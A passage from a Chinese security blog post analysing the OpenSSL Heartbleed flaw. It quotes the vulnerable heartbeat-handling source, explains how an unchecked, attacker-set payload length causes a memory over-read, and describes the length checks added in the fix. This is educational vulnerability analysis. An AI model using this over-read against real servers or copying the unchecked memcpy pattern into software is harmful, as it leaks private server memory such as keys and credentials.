<h2 id="2-漏洞原理"><a href="#2-漏洞原理" class="headerlink" title="2. 漏洞原理"></a>2. 漏洞原理</h2><p>OpenSSL 是 SSL 协议实现的开源软件包，存在漏洞的两个文件为 ssl/d1_both.c 和 ssl/t1_lib.c，这两个文件中的 dtls1_process_heartbeat() 和 tls1_process_heartbeat() 分别为 DTLS（数据报安全传输协议）和 TLS（传输层安全协议）处理心跳请求包的函数。</p>
<h3 id="1）解析心跳请求包"><a href="#1）解析心跳请求包" class="headerlink" title="1）解析心跳请求包"></a>1）解析心跳请求包</h3><p>dtls1_process_heartbeat() 函数和 tls1_process_heartbeat() 函数的代码完全相同，下面对 openssl-1.0.1e 源码包中的 dtls1_process_heartbeat() 函数进行分析。dtls1_process_heartbeat() 函数首先解析客户端所发的心跳请求包，代码中将&amp;s-&gt;s3-&gt;rrec.data[0] 的值赋给指针 p。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// p 指向 SSL3 记录数据，即心跳消息</span></div><div class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> *p = &amp;s-&gt;s3-&gt;rrec.data[<span class="number">0</span>], *pl;</div><div class="line"><span class="keyword">unsigned</span> <span class="keyword">short</span> hbtype;</div><div class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> payload;</div><div class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> padding = <span class="number">16</span>; <span class="comment">/* Use minimum padding */</span></div></pre></td></tr></table></figure></p>
<p>为找到 s-&gt;s3-&gt;rrec.data[0] 的定义，通过依次寻找 <code>SSL/ ssl_st/s3/ssl3_state_st/rrec/ SSL3_RECORD</code> 的顺序，最终找到 SSL 记录结构体 SSL3_RECORD 的定义。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/* crypto/ossl_tpy.h */</span></div><div class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">ssl_st</span> <span class="title">SSL</span>;</span></div><div class="line"></div><div class="line"><span class="comment">/* ssl/ssl.h */</span></div><div class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ssl_st</span></span></div><div class="line">&#123;</div><div class="line">    ...</div><div class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">ssl2_state_st</span> *<span class="title">s2</span>;</span> <span class="comment">/* SSLv2 variables */</span></div><div class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">ssl3_state_st</span> *<span class="title">s3</span>;</span> <span class="comment">/* SSLv3 variables */</span></div><div class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">dtls1_state_st</span> *<span class="title">d1</span>;</span> <span class="comment">/* DTLSv1 variables */</span></div><div class="line">	...</div><div class="line">&#125;</div><div class="line"><span class="comment">/* ssl/ssl3.h */</span></div><div class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">ssl3_state_st</span></span></div><div class="line">&#123;</div><div class="line">	...</div><div class="line">	SSL3_RECORD rrec;	<span class="comment">/* each decoded record goes in here */</span></div><div class="line">	...</div><div class="line">&#125;</div><div class="line"><span class="comment">/* ssl/ssl3.h */</span></div><div class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">ssl3_record_st</span></span></div><div class="line">&#123;</div><div class="line"><span class="comment">/*r */</span>	<span class="keyword">int</span> type;               <span class="comment">/* type of record */</span></div><div class="line"><span class="comment">/*rw*/</span>	<span class="keyword">unsigned</span> <span class="keyword">int</span> length;      <span class="comment">/* How many bytes available */</span></div><div class="line"><span class="comment">/*r */</span>	<span class="keyword">unsigned</span> <span class="keyword">int</span> off;         <span class="comment">/* read/write offset into 'buf' */</span></div><div class="line"><span class="comment">/*rw*/</span>	<span class="keyword">unsigned</span> <span class="keyword">char</span> *data;      <span class="comment">/* pointer to the record data */</span></div><div class="line"><span class="comment">/*rw*/</span>	<span class="keyword">unsigned</span> <span class="keyword">char</span> *input;     <span class="comment">/* where the decode bytes are */</span></div><div class="line"><span class="comment">/*r */</span>	<span class="keyword">unsigned</span> <span class="keyword">char</span> *comp;     <span class="comment">/* only used with decompression - malloc()ed */</span></div><div class="line"><span class="comment">/*r */</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> epoch;      <span class="comment">/* epoch number, needed by DTLS1 */</span></div><div class="line"><span class="comment">/*r */</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> seq_num[<span class="number">8</span>];  <span class="comment">/* sequence number, needed by DTLS1 */</span></div><div class="line">&#125; SSL3_RECORD;</div></pre></td></tr></table></figure></p>
<p>由 SSL3_RECORD 结构体定义可知，每条 SSL3 记录中都包含类型字段（type）、长度字段（length）和指向记录数据的指针（data），所以 dtls1_process_heartbeat() 函数通过 p = &amp;s-&gt;s3-&gt;rrec.data[0] 将指针 p 指向心跳消息。接着把心跳类型（0x01）赋给 hbtype；使用 n2s 宏取两个字节的载荷长度（0x0155）赋给变量 payload，并将 p 指针移动 2 个字节，此时指针 p 指向心跳包载荷；最后令 pl 指向心跳包载荷。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">hbtype = *p++;  <span class="comment">// 心跳包类型</span></div><div class="line">n2s(p, payload);  <span class="comment">// 心跳包载荷长度</span></div><div class="line">pl = p;  <span class="comment">// pl 指向心跳包载荷</span></div></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/0x4C43/BlogImages/master/1586019911_95471870.jpg" alt="">   </p>
<h3 id="2）分配内存空间"><a href="#2）分配内存空间" class="headerlink" title="2）分配内存空间"></a>2）分配内存空间</h3><p>解析完心跳包后，若心跳包类型为 TLS1_HB_REQUEST，则为后续构造心跳响应包分配长度为 360 bytes 的内存。<font color="red"> 这里未对心跳载荷长度字段进行检查就分配内存是漏洞产生的重要原因。</font><br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> (hbtype == TLS1_HB_REQUEST)</div><div class="line">&#123;</div><div class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> *buffer, *bp;</div><div class="line">    <span class="keyword">int</span> r;</div><div class="line">    <span class="comment">/* 为心跳响应包分配内存, 大小为 1 byte(Heartbeat Type)+ 2 bytes(Payload length)+</span></div><div class="line">	     341 bytes(Payload) + 16 bytes(Padding) = 360 bytes */</div><div class="line">    buffer = OPENSSL_malloc(<span class="number">1</span> + <span class="number">2</span> + payload + padding);</div><div class="line">    bp = buffer;    <span class="comment">// bp指向刚分配的内存</span></div><div class="line">    …</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<h3 id="3）构造心跳响应包"><a href="#3）构造心跳响应包" class="headerlink" title="3）构造心跳响应包"></a>3）构造心跳响应包</h3><p>分配好内存后构造心跳响应包。首先填充 1 bytes 的心跳包类型为 TLS1_HB_RESPONSE（0x02）；然后填充心跳包载荷长度为 payload（0x0155）；<font color="red">接着填充心跳包的内容（长度为 0x0155 bytes），这一步是漏洞产生的直接原因</font>。这里将指针 pl 所指向内存为起始，长度为 payload 字节的数据作为心跳包内容。由于指针 pl 指向用户提供的心跳请求包载荷，并且心跳包载荷长度（payload）完全由用户控制，当 payload 大于实际心跳请求包载荷的长度时，将导致越界访问内存；最后填充随机字节。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">*bp++ = TLS1_HB_RESPONSE;  <span class="comment">// 填充 1 byte 的心跳包类型</span></div><div class="line">s2n(payload, bp);  <span class="comment">// 填充 2 bytes 的载荷长度</span></div><div class="line"><span class="comment">/* 填充心跳响应包载荷（由用户提供），由于心跳包载荷长度（payload）完全由用户</span></div><div class="line">* 控制，当 payload 大于实际心跳包载荷的长度时，将导致越界访问内存。*/</div><div class="line"><span class="built_in">memcpy</span>(bp, pl, payload);</div><div class="line">bp += payload;</div><div class="line"><span class="comment">/* 填充随机字节 */</span></div><div class="line">RAND_pseudo_bytes(bp, padding);</div></pre></td></tr></table></figure></p>
<p>由 dtls1_process_heartbeat() 函数构造出的心跳响应包结构如下图所示。<br><img src="https://raw.githubusercontent.com/0x4C43/BlogImages/master/1586019907_77216907.jpg" alt="">  </p>
<h3 id="4）发送心跳响应包"><a href="#4）发送心跳响应包" class="headerlink" title="4）发送心跳响应包"></a>4）发送心跳响应包</h3><p>最后通过 dtls1_write_bytes() 函数把构造好的心跳响应包发送给客户端，服务器将会把内存中除客户端发送的心跳包载荷外的其他数据返回给客户端，导致内存泄露。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/* 将构造好的心跳响应包写入 SSL3_RECORD 中，并返回给客户端 */</span></div><div class="line">r = dtls1_write_bytes(s, TLS1_RT_HEARTBEAT, buffer, <span class="number">3</span> + payload + padding);</div></pre></td></tr></table></figure></p>
<h1 id="0x04-漏洞修复"><a href="#0x04-漏洞修复" class="headerlink" title="0x04 漏洞修复"></a>0x04 漏洞修复</h1><p>openssl-1.0.1f 中该漏洞进行了修复，分析补丁代码可看到 dtls1_process_heartbeat() 函数在解析心跳请求包前添加了对记录长度字段 s-&gt;s3-&gt;rrec.length 的检查。</p>
<ul>
<li>检查 1：当实际心跳载荷（payload）长度为 0 时，函数返回 0；</li>
<li>检查 2：当心跳包载荷长度（payload length）大于实际载荷（payload）的长度时，函数返回 0。 </li>
</ul>
<p><img src="https://raw.githubusercontent.com/0x4C43/BlogImages/master/1586019882_16326376.jpg" alt=""><br>添加长度检查后，客户端只有在发送实际心跳载荷（payload）长度大于 0，且心跳包载荷长度 (payload length) 不大于实际心跳包载荷（payload）长度的心跳请求包时，服务器才会返回心跳响应包，因此可成功修补该漏洞。</p>
<hr>
<p>References:<br>[1] <a href="https://hub.docker.com/r/hmlio/vaas-cve-2014-0160/" target="_blank" rel="external">Heartbleed docker</a><br>[2] <a href="https://tools.ietf.org/html/rfc6520" target="_blank" rel="external">Transport Layer Security (TLS) and Datagram Transport Layer Security (DTLS) Heartbeat Extension</a><br>[3] 强小辉, 陈波, 陈国凯. OpenSSL HeartBleed 漏洞分析及检测技术研究</p>

      
    </div>

    <div>
      
        

      
    </div>

    <div>
      
        

      
    </div>

    <div>
      
        

      
    </div>

    <footer class="post-footer">
      
        <div class="post-tags">
          
            <a href="/tags/Heartbleed/" rel="tag"># Heartbleed</a>
          
        </div>
      

      
        
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2018/0707/expanding-ubuntu-disk-space-in-vmware/" rel="next" title="VMWare 中扩展 ubuntu 磁盘空间">
                <i class="fa fa-chevron-left"></i> VMWare 中扩展 ubuntu 磁盘空间
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
              <a href="/2018/0617/ia32-memory-model-and-address-mapping/" rel="prev" title="IA-32 内存模型与地址映射">
                IA-32 内存模型与地址映射 <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
      

      
      
    </footer>
  </article>



    <div class="post-spread">
      
    </div>
  </div>


          </div>
          


          
  <div class="comments" id="comments">
    
      <div id="disqus_thread">
        <noscript>
          Please enable JavaScript to view the
          <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a>
        </noscript>
      </div>
    
  </div>


        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
            Table of Contents
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview">
            Overview
          </li>
        </ul>
      

      <section class="site-overview sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
          <img class="site-author-image" itemprop="image"
               src="/uploads/binary.jpg"
               alt="0x4C43" />
          <p class="site-author-name" itemprop="name">0x4C43</p>
           
              <p class="site-description motion-element" itemprop="description">Binary Exploitation</p>
          
        </div>
        <nav class="site-state motion-element">

          
            <div class="site-state-item site-state-posts">
              <a href="/archives">
                <span class="site-state-item-count">33</span>
                <span class="site-state-item-name">posts</span>
              </a>
            </div>
          

          
            
            
            <div class="site-state-item site-state-categories">
              <a href="/categories/index.html">
                <span class="site-state-item-count">12</span>
                <span class="site-state-item-name">categories</span>
              </a>
            </div>
          

          
            
            
            <div class="site-state-item site-state-tags">
              <a href="/tags/index.html">
                <span class="site-state-item-count">57</span>
                <span class="site-state-item-name">tags</span>
              </a>
            </div>
          

        </nav>

        
          <div class="feed-link motion-element">
            <a href="/atom.xml" rel="alternate">
              <i class="fa fa-rss"></i>
              RSS
            </a>
          </div>
        

        <div class="links-of-author motion-element">
          
            
              <span class="links-of-author-item">
                <a href="https://github.com/0x4C43" target="_blank" title="GitHub">
                  
                    <i class="fa fa-fw fa-github"></i>
                  
                  GitHub
                </a>
              </span>
            
          
        </div>

        
        
          <div class="cc-license motion-element" itemprop="license">
            <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" target="_blank" rel="external nofollow">
              <img src="/images/cc-by-nc-sa.svg" alt="Creative Commons" />
            </a>
          </div>
        

        
        

        


      </section>

      
      <!--noindex-->
        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
              
            

            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#0x01-基础知识"><span class="nav-text">0x01 基础知识</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-SSL协议简介"><span class="nav-text">1. SSL协议简介</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-SSL握手过程"><span class="nav-text">2. SSL握手过程</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-SSL“心跳”机制"><span class="nav-text">3. SSL“心跳”机制</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-OpenSSL"><span class="nav-text">4. OpenSSL</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x02-漏洞复现"><span class="nav-text">0x02 漏洞复现</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-漏洞信息"><span class="nav-text">1. 漏洞信息</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-漏洞复现"><span class="nav-text">2. 漏洞复现</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1）环境"><span class="nav-text">1）环境</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2）测试"><span class="nav-text">2）测试</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x03-漏洞原理"><span class="nav-text">0x03 漏洞原理</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-POC-分析"><span class="nav-text">1. POC 分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-漏洞原理"><span class="nav-text">2. 漏洞原理</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1）解析心跳请求包"><span class="nav-text">1）解析心跳请求包</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2）分配内存空间"><span class="nav-text">2）分配内存空间</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3）构造心跳响应包"><span class="nav-text">3）构造心跳响应包</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4）发送心跳响应包"><span class="nav-text">4）发送心跳响应包</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x04-漏洞修复"><span class="nav-text">0x04 漏洞修复</span></a></li></ol></div>
            

          </div>
        </section>
      <!--/noindex-->
      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright" >
  
  &copy;  2017 - 
  <span itemprop="copyrightYear">2020</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">0x4C43</span>
</div>



        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>

  
    <span class="site-uv">
      访客数
      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
      人次
    </span>
  

  
    <span class="site-pv">
      总访问量
      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
      次
    </span>
  
</div>


        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>

  
  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>

  
  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>

  
  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>

  
  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>

  
  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.0"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.0"></script>



  
  

  
  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.0"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=5.1.0"></script>



  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.0"></script>



  


  

    
      <script id="dsq-count-scr" src="https://0x4c43s-blog.disqus.com/count.js" async></script>
    

    
      <script type="text/javascript">
        var disqus_config = function () {
          this.page.url = 'http://0x4c43.cn/2018/0701/heartbleed-vulnerability-analysis/';
          this.page.identifier = '2018/0701/heartbleed-vulnerability-analysis/';
          this.page.title = 'Heartbleed 漏洞分析';
        };
        var d = document, s = d.createElement('script');
        s.src = 'https://0x4c43s-blog.disqus.com/embed.js';
        s.setAttribute('data-timestamp', '' + +new Date());
        (d.head || d.body).appendChild(s);
      </script>
    

  




	





  
    
    <script>
      var cloudTieConfig = {
        url: document.location.href, 
        sourceId: "",
        productKey: "c190dfc84c3444f78b4a39fbfe45d4ee",
        target: "cloud-tie-wrapper"
      };
    </script>
    <script src="https://img1.ws.126.net/f2e/tie/yun/sdk/loader.js"></script>
  










  

  <script type="text/javascript">
    // Popup Window;
    var isfetched = false;
    // Search DB path;
    var search_path = "search.xml";
    if (search_path.length == 0) {
      search_path = "search.xml";
    }
    var path = "/" + search_path;
    // monitor main search box;

    function proceedsearch() {
      $("body")
        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
        .css('overflow', 'hidden');
      $('.popup').toggle();
    }
    // search function;
    var searchFunc = function(path, search_id, content_id) {
      'use strict';
      $.ajax({
        url: path,
        dataType: "xml",
        async: true,
        success: function( xmlResponse ) {
          // get the contents from search data
          isfetched = true;
          $('.popup').detach().appendTo('.header-inner');
          var datas = $( "entry", xmlResponse ).map(function() {
            return {
              title: $( "title", this ).text(),
              content: $("content",this).text(),
              url: $( "url" , this).text()
            };
          }).get();
          var $input = document.getElementById(search_id);
          var $resultContent = document.getElementById(content_id);
          $input.addEventListener('input', function(){
            var matchcounts = 0;
            var str='<ul class=\"search-result-list\">';
            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
            $resultContent.innerHTML = "";
            if (this.value.trim().length > 1) {
              // perform local searching
              datas.forEach(function(data) {
                var isMatch = false;
                var content_index = [];
                var data_title = data.title.trim().toLowerCase();
                var data_content = data.content.trim().replace(/<[^>]+>/g,"").toLowerCase();
                var data_url = decodeURIComponent(data.url);
                var index_title = -1;
                var index_content = -1;
                var first_occur = -1;
                // only match artiles with not empty titles and contents
                if(data_title != '') {
                  keywords.forEach(function(keyword, i) {
                    index_title = data_title.indexOf(keyword);
                    index_content = data_content.indexOf(keyword);
                    if( index_title >= 0 || index_content >= 0 ){
                      isMatch = true;
                      if (i == 0) {
                        first_occur = index_content;
                      }
                    }

                  });
                }
                // show search results
                if (isMatch) {
                  matchcounts += 1;
                  str += "<li><a href='"+ data_url +"' class='search-result-title'>"+ data_title +"</a>";
                  var content = data.content.trim().replace(/<[^>]+>/g,"");
                  if (first_occur >= 0) {
                    // cut out 100 characters
                    var start = first_occur - 20;
                    var end = first_occur + 80;
                    if(start < 0){
                      start = 0;
                    }
                    if(start == 0){
                      end = 50;
                    }
                    if(end > content.length){
                      end = content.length;
                    }
                    var match_content = content.substring(start, end);
                    // highlight all keywords
                    keywords.forEach(function(keyword){
                      var regS = new RegExp(keyword, "gi");
                      match_content = match_content.replace(regS, "<b class=\"search-keyword\">"+keyword+"</b>");
                    });

                    str += "<p class=\"search-result\">" + match_content +"...</p>"
                  }
                  str += "</li>";
                }
              })};
            str += "</ul>";
            if (matchcounts == 0) { str = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>' }
            if (keywords == "") { str = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>' }
            $resultContent.innerHTML = str;
          });
          proceedsearch();
        }
      });}

    // handle and trigger popup window;
    $('.popup-trigger').click(function(e) {
      e.stopPropagation();
      if (isfetched == false) {
        searchFunc(path, 'local-search-input', 'local-search-result');
      } else {
        proceedsearch();
      };
    });

    $('.popup-btn-close').click(function(e){
      $('.popup').hide();
      $(".local-search-pop-overlay").remove();
      $('body').css('overflow', '');
    });
    $('.popup').click(function(e){
      e.stopPropagation();
    });
  </script>





  

  

  

  

  

</body>
</html>
